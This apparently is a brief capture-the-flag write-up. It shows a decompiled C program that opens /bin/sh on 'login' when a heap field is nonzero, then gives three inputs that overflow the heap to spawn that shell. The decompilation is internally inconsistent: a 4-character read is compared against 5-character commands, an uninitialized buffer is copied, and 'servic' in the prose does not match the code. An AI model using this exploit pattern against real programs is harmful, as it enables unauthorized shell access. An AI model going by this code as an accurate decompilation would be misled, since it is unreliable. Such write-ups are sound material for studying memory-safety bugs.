Here is a humanized version of the decompiled code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *auth = NULL;
char *service = NULL;

int main(void) {
    char input[5];
    char temp[2];
    char buffer[125];

    while (1) {
        printf("%p, %p \n", auth, service);

        if (!fgets(input, sizeof(input), stdin)) {
            return 0;
        }

        if (strncmp(input, "auth ", 5) == 0) {
            auth = (char *)malloc(4);
            if (auth) {
                memset(auth, 0, 4);
                size_t len = strlen(temp);
                if (len < 30) {
                    strcpy(auth, temp);
                }
            }
        }

        if (strncmp(input, "reset", 5) == 0) {
            free(auth);
        }

        if (strncmp(input, "service", 6) == 0) {
            service = strdup(buffer);
        }

        if (strncmp(input, "login", 5) == 0) {
            if (*(int *)(auth + 0x20) == 0) {
                fwrite("Password:\n", 1, 10, stdout);
            } else {
                system("/bin/sh");
            }
        }
    }

    return 0;
}
```

We can see straight away that if the input is login, it checks if auth + 0x20 == 0 and spawns a shell accordingly.

We also see that there inputing "auth " will let you continue in the code.

If you input "servic", the input is strdup'ed. We can exploit that to overflow to auth and write the auth + 0x20 byte to something different than 0 and then login to spawn the shell.

First step :
`"auth "`
Second step :
`"serviceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"`
Third step :
`login`

Then the shell spawns.
